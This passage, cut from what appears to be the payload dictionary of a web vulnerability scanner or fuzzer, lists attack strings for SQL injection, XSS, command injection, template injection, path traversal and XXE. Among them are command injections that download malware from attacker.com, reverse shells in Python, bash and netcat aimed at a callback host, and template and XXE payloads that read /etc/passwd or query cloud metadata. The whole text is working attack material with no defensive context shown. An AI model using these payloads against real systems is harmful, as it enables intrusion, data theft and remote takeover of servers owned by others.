                "substring(version(),1,10)",
                "ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))",
                "ord(mid((select user()),1,1))>100",
                "benchmark(10000000,MD5(1))",
                "sleep(5)",
                "waitfor delay '0:0:5'",
                "pg_sleep(5)",
                "dbms_pipe.receive_message('a',10)"
            ],
            "xss": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "<svg/onload=alert(1)>",
                "<body onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<marquee onstart=alert(1)>",
                "<details ontoggle=alert(1)>",
                "<svg><script>alert(1)</script></svg>",
                "<img src=1 onerror=alert(1)>",
                "<img src='1' onerror='alert(1)'>",
                "<img src=\"1\" onerror=\"alert(1)\">",
                "<div onmouseover=\"alert(1)\">Hover me</div>",
                "<input onfocus=alert(1) autofocus>",
                "<video src=1 onerror=alert(1)>",
                "<audio src=1 onerror=alert(1)>",
                "<math><mtext><div onmouseover='alert(1)'>",
                "<form><button formaction=javascript:alert(1)>",
                "<isindex type=image src=1 onerror=alert(1)>",
                "<object data=javascript:alert(1)>",
                "<svg><script xlink:href=,alert(1)></script></svg>",
                "<embed src=javascript:alert(1)>",
                "<a href=javascript:alert(1)>Click me</a>",
                "<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>",
                "<img src=1 onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
                "<img src=1 onerror=this.src='javascript:alert(1)'>",
                "<img src=1 onerror=location='javascript:alert(1)'>",
                "<img src=1 onerror=import('javascript:alert(1)')>",
                "<img src=1 onerror=fetch('javascript:alert(1)')>",
                "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
                "<svg><set onbegin=alert(1) attributename=x attributetype=xml dur=1s>",
                "<svg><animate onend=alert(1) attributeName=x dur=1s>",
                "<svg><set onend=alert(1) attributename=x attributetype=xml dur=1s>",
                "<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatcount=2>",
                "<svg><set onrepeat=alert(1) attributename=x attributetype=xml dur=1s repeatcount=2>",
                "<svg><a><circle r=40 fill=red><animate attributeName=fill values=blue;red;green dur=1s repeatcount=indefinite></a>",
                "<svg><a><rect width=100 height=100><animate attributeName=width values=0;100;0 dur=1s repeatcount=indefinite></a>",
                "<svg><a><ellipse rx=10 ry=10><animate attributeName=rx values=0;10;0 dur=1s repeatcount=indefinite></a>",
                "<svg><a><line x1=0 y1=0 x2=100 y2=100><animate attributeName=x1 values=0;100;0 dur=1s repeatcount=indefinite></a>",
                "<svg><a><polyline points=0,0 0,100 100,100 100,0><animate attributeName=points values='0,0 0,100 100,100 100,0';'50,50 50,150 150,150 150,50' dur=1s repeatcount=indefinite></a>",
                "<svg><a><polygon points=0,0 0,100 100,100 100,0><animate attributeName=points values='0,0 0,100 100,100 100,0';'50,50 50,150 150,150 150,50' dur=1s repeatcount=indefinite></a>",
                "<svg><a><path d=M0,0 L0,100 L100,100 L100,0 Z><animate attributeName=d values='M0,0 L0,100 L100,100 L100,0 Z';'M50,50 L50,150 L150,150 L150,50 Z' dur=1s repeatcount=indefinite></a>",
                "<svg><a><text x=20 y=20>Hello</text><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><tspan x=20 y=20>Hello</tspan><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><tref xlink:href=#text><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><textpath xlink:href=#path><tspan>Hello</tspan></textpath><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><altglyph><tspan>Hello</tspan></altglyph><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><textareatext><tspan>Hello</tspan></textareatext><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><foreignobject><tspan>Hello</tspan></foreignobject><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><switch><tspan>Hello</tspan></switch><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><symbol><tspan>Hello</tspan></symbol><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><use><tspan>Hello</tspan></use><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><image><tspan>Hello</tspan></image><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><cursor><tspan>Hello</tspan></cursor><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><font><tspan>Hello</tspan></font><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><font-face><tspan>Hello</tspan></font-face><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><glyph><tspan>Hello</tspan></glyph><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><missing-glyph><tspan>Hello</tspan></missing-glyph><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><hkern><tspan>Hello</tspan></hkern><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><vkern><tspan>Hello</tspan></vkern><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><metadata><tspan>Hello</tspan></metadata><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><desc><tspan>Hello</tspan></desc><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><title><tspan>Hello</tspan></title><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><script><tspan>Hello</tspan></script><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><style><tspan>Hello</tspan></style><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><view><tspan>Hello</tspan></view><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><filter><tspan>Hello</tspan></filter><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><feblend><tspan>Hello</tspan></feblend><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><fecolormatrix><tspan>Hello</tspan></fecolormatrix><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><fecomponenttransfer><tspan>Hello</tspan></fecomponenttransfer><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><fecomposite><tspan>Hello</tspan></fecomposite><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><feconvolvematrix><tspan>Hello</tspan></feconvolvematrix><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><fediffuselighting><tspan>Hello</tspan></fediffuselighting><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><fedisplacementmap><tspan>Hello</tspan></fedisplacementmap><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><fedistantlight><tspan>Hello</tspan></fedistantlight><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><feflood><tspan>Hello</tspan></feflood><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><fefunca><tspan>Hello</tspan></fefunca><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><fegaussianblur><tspan>Hello</tspan></fegaussianblur><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><feimage><tspan>Hello</tspan></feimage><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><femerge><tspan>Hello</tspan></femerge><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><femorphology><tspan>Hello</tspan></femorphology><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><feoffset><tspan>Hello</tspan></feoffset><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><fepointlight><tspan>Hello</tspan></fepointlight><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><fespecularlighting><tspan>Hello</tspan></fespecularlighting><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><fespotlight><tspan>Hello</tspan></fespotlight><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><fetile><tspan>Hello</tspan></fetile><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><feturbulence><tspan>Hello</tspan></feturbulence><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><animatecolor><tspan>Hello</tspan></animatecolor><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><animatemotion><tspan>Hello</tspan></animatemotion><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><animatetransform><tspan>Hello</tspan></animatetransform><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><mpath><tspan>Hello</tspan></mpath><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><set><tspan>Hello</tspan></set><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><animate><tspan>Hello</tspan></animate><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><discard><tspan>Hello</tspan></discard><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><hatch><tspan>Hello</tspan></hatch><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><hatchpath><tspan>Hello</tspan></hatchpath><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><mesh><tspan>Hello</tspan></mesh><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><meshgradient><tspan>Hello</tspan></meshgradient><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><meshpatch><tspan>Hello</tspan></meshpatch><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><meshrow><tspan>Hello</tspan></meshrow><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>",
                "<svg><a><solidcolor><tspan>Hello</tspan></solidcolor><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>"
            ],
            "command_injection": [
                "; whoami",
                "| whoami",
                "& whoami",
                "&& whoami",
                "`whoami`",
                "$(whoami)",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "& cat /etc/passwd",
                "&& cat /etc/passwd",
                "`cat /etc/passwd`",
                "$(cat /etc/passwd)",
                "; ls -la",
                "| ls -la",
                "& ls -la",
                "&& ls -la",
                "`ls -la`",
                "$(ls -la)",
                "; id",
                "| id",
                "& id",
                "&& id",
                "`id`",
                "$(id)",
                "; pwd",
                "| pwd",
                "& pwd",
                "&& pwd",
                "`pwd`",
                "$(pwd)",
                "| dir",
                "& dir",
                "&& dir",
                "`dir`",
                "$(dir)",
                "; net user",
                "| net user",
                "& net user",
                "&& net user",
                "`net user`",
                "$(net user)",
                "; ipconfig",
                "| ipconfig",
                "& ipconfig",
                "&& ipconfig",
                "`ipconfig`",
                "$(ipconfig)",
                "; ps aux",
                "| ps aux",
                "& ps aux",
                "&& ps aux",
                "`ps aux`",
                "$(ps aux)",
                "; netstat -an",
                "| netstat -an",
                "& netstat -an",
                "&& netstat -an",
                "`netstat -an`",
                "$(netstat -an)",
                "; route print",
                "| route print",
                "& route print",
                "&& route print",
                "`route print`",
                "$(route print)",
                "; arp -a",
                "| arp -a",
                "& arp -a",
                "&& arp -a",
                "`arp -a`",
                "$(arp -a)",
                "; nslookup google.com",
                "| nslookup google.com",
                "& nslookup google.com",
                "&& nslookup google.com",
                "`nslookup google.com`",
                "$(nslookup google.com)",
                "; ping -c 1 google.com",
                "| ping -c 1 google.com",
                "& ping -c 1 google.com",
                "&& ping -c 1 google.com",
                "`ping -c 1 google.com`",
                "$(ping -c 1 google.com)",
                "; traceroute google.com",
                "| traceroute google.com",
                "& traceroute google.com",
                "&& traceroute google.com",
                "`traceroute google.com`",
                "$(traceroute google.com)",
                "; dig google.com",
                "| dig google.com",
                "& dig google.com",
                "&& dig google.com",
                "`dig google.com`",
                "$(dig google.com)",
                "; host google.com",
                "| host google.com",
                "& host google.com",
                "&& host google.com",
                "`host google.com`",
                "$(host google.com)",
                "; wget http://attacker.com/malware",
                "| wget http://attacker.com/malware",
                "& wget http://attacker.com/malware",
                "&& wget http://attacker.com/malware",
                "`wget http://attacker.com/malware`",
                "$(wget http://attacker.com/malware)",
                "; curl http://attacker.com/malware",
                "| curl http://attacker.com/malware",
                "& curl http://attacker.com/malware",
                "&& curl http://attacker.com/malware",
                "`curl http://attacker.com/malware`",
                "$(curl http://attacker.com/malware)",
                "; nc attacker.com 4444",
                "| nc attacker.com 4444",
                "& nc attacker.com 4444",
                "&& nc attacker.com 4444",
                "`nc attacker.com 4444`",
                "$(nc attacker.com 4444)",
                "; nmap -sT attacker.com",
                "| nmap -sT attacker.com",
                "& nmap -sT attacker.com",
                "&& nmap -sT attacker.com",
                "`nmap -sT attacker.com`",
                "$(nmap -sT attacker.com)",
                "; nikto -h attacker.com",
                "| nikto -h attacker.com",
                "& nikto -h attacker.com",
                "&& nikto -h attacker.com",
                "`nikto -h attacker.com`",
                "$(nikto -h attacker.com)",
                "; sqlmap -u attacker.com",
                "| sqlmap -u attacker.com",
                "& sqlmap -u attacker.com",
                "&& sqlmap -u attacker.com",
                "`sqlmap -u attacker.com`",
                "$(sqlmap -u attacker.com)",
                "; msfconsole",
                "| msfconsole",
                "& msfconsole",
                "&& msfconsole",
                "`msfconsole`",
                "$(msfconsole)",
                "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + callback_host + "\"," + callback_port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                "| python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + callback_host + "\"," + callback_port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                "& python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + callback_host + "\"," + callback_port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                "&& python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + callback_host + "\"," + callback_port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                "`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + callback_host + "\"," + callback_port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'`",
                "$(python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + callback_host + "\"," + callback_port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);')",
                "; bash -i >& /dev/tcp/" + callback_host + "/" + callback_port + " 0>&1",
                "| bash -i >& /dev/tcp/" + callback_host + "/" + callback_port + " 0>&1",
                "& bash -i >& /dev/tcp/" + callback_host + "/" + callback_port + " 0>&1",
                "&& bash -i >& /dev/tcp/" + callback_host + "/" + callback_port + " 0>&1",
                "`bash -i >& /dev/tcp/" + callback_host + "/" + callback_port + " 0>&1`",
                "$(bash -i >& /dev/tcp/" + callback_host + "/" + callback_port + " 0>&1)",
                "; nc -e /bin/sh " + callback_host + " " + callback_port,
                "| nc -e /bin/sh " + callback_host + " " + callback_port,
                "& nc -e /bin/sh " + callback_host + " " + callback_port,
                "&& nc -e /bin/sh " + callback_host + " " + callback_port,
                "`nc -e /bin/sh " + callback_host + " " + callback_port + "`",
                "$(nc -e /bin/sh " + callback_host + " " + callback_port + ")"
            ],
            "ssti": [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "#{7*7}",
                "${{7*7}}",
                "@(7*7)",
                "#{ 7*7 }",
                "{{7*'7'}}",
                "${7*'7'}",
                "<%= 7*'7' %>",
                "#{7*'7'}",
                "${{7*'7'}}",
                "@(7*'7')",
                "#{ 7*'7' }",
                "{{range(1,7)}}{{7*7}}{{end}}",
                "${range(1,7)}${7*7}${end}",
                "<% for i in range(1,7) %><%= 7*7 %><% end %>",
                "#{range(1,7)}#{7*7}#{end}",
                "${{range(1,7)}}${{7*7}}${{end}}",
                "@(range(1,7))@(7*7)@(end)",
                "#{ range(1,7) }#{ 7*7 }#{ end }",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "${''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}",
                "<%= ''.class.mro[2].subclasses[40]('/etc/passwd').read %>",
                "#{''.class.mro[2].subclasses[40]('/etc/passwd').read}",
                "${{''.class.mro[2].subclasses[40]('/etc/passwd').read}}",
                "@(''.class.mro[2].subclasses[40]('/etc/passwd').read)",
                "#{ ''.class.mro[2].subclasses[40]('/etc/passwd').read }",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "${config.__class__.__init__.__globals__['os'].popen('id').read()}",
                "<%= config.class.init.globals['os'].popen('id').read %>",
                "#{config.class.init.globals['os'].popen('id').read}",
                "${{config.class.init.globals['os'].popen('id').read}}",
                "@(config.class.init.globals['os'].popen('id').read)",
                "#{ config.class.init.globals['os'].popen('id').read }",
                "{{self.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}",
                "${self.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}",
                "<%= self.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read %>",
                "#{self.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read}",
                "${{self.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read}}",
                "@(self.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read)",
                "#{ self.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read }",
                "{{''.__class__.__bases__[0].__subclasses__()[242]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}",
                "${''.__class__.__bases__[0].__subclasses__()[242]('whoami',shell=True,stdout=-1).communicate()[0].strip()}",
                "<%= ''.class.bases[0].subclasses[242]('whoami',shell=True,stdout=-1).communicate[0].strip %>",
                "#{''.class.bases[0].subclasses[242]('whoami',shell=True,stdout=-1).communicate[0].strip}",
                "${{''.class.bases[0].subclasses[242]('whoami',shell=True,stdout=-1).communicate[0].strip}}",
                "@(''.class.bases[0].subclasses[242]('whoami',shell=True,stdout=-1).communicate[0].strip)",
                "#{ ''.class.bases[0].subclasses[242]('whoami',shell=True,stdout=-1).communicate[0].strip }"
            ],
            "path_traversal": [
                "../../../../etc/passwd",
                "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "../../../etc/shadow",
                "....//....//....//....//etc/passwd",
                "..%2f..%2f..%2f..%2fetc%2fpasswd",
                "..%5c..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
                "....%2f....%2f....%2f....%2fetc%2fpasswd",
                "..%252f..%252f..%252f..%252fetc%252fpasswd",
                "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "..%255c..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts",
                "/etc/passwd%00",
                "c:\\windows\\system32\\drivers\\etc\\hosts%00",
                "../../../../../../../../../../../../etc/passwd",
                "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "../../../etc/passwd%00",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00",
                "../../../../../../../../../../etc/passwd",
                "..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "../../../../../../../../../../../etc/passwd",
                "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "../../../../../../../../../../../../etc/shadow",
                "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\config\\SAM",
                "../../../../../../../../../../../../boot.ini",
                "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini",
                "../../../../../../../../../../../../proc/self/environ",
                "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\proc\\self\\environ",
                "../../../../../../../../../../../../proc/version",
                "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\proc\\version",
                "../../../../../../../../../../../../var/log/apache2/access.log",
                "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\var\\log\\apache2\\access.log",
                "../../../../../../../../../../../../var/log/apache/access.log",
                "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\var\\log\\apache\\access.log",
                "../../../../../../../../../../../../var/log/httpd/access_log",
                "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\var\\log\\httpd\\access_log",
                "../../../../../../../../../../../../usr/local/apache/logs/access.log",
                "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\usr\\local\\apache\\logs\\access.log",
                "../../../../../../../../../../../../var/log/vsftpd.log",
                "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\var\\log\\vsftpd.log",
                "../../../../../../../../../../../../var/log/sshd.log",
                "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\var\\log\\sshd.log",
                "../../../../../../../../../../../../var/log/mail",
                "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\var\\log\\mail",
                "../../../../../../../../../../../../proc/self/cmdline",
                "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\proc\\self\\cmdline",
                "../../../../../../../../../../../../proc/self/stat",
                "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\proc\\self\\stat",
                "../../../../../../../../../../../../proc/self/status",
                "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\proc\\self\\status",
                "../../../../../../../../../../../../proc/self/fd/0",
                "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\proc\\self\\fd\\0",
                "../../../../../../../../../../../../proc/self/fd/1",
                "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\proc\\self\\fd\\1",
                "../../../../../../../../../../../../proc/self/fd/2",
                "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\proc\\self\\fd\\2",
                "../../../../../../../../../../../../proc/self/fd/255",
                "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\proc\\self\\fd\\255"
            ],
            "xxe": [
                """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://attacker.com/xxe" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd" >%xxe;]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "expect://id" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "ftp://attacker.com/" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "gopher://attacker.com/" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "dict://attacker.com:11211/stat" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "jar://http://attacker.com/evil.jar" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "netdoc://attacker.com/" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "ldap://attacker.com/" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "mailto:attacker@attacker.com" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "text/plain;base64,SGVsbG8sIFdvcmxkIQ==" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://[::1]/" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://127.0.0.1:22/" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://localhost:3306/" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "https://attacker.com/" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/self/environ" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/version" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/issue" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/hostname" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/resolv.conf" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/network/interfaces" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/sysconfig/network" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/fstab" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/crontab" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///var/log/apache2/access.log" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///var/log/apache/access.log" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///var/log/httpd/access_log" >]><foo>&xxe;</foo>""",
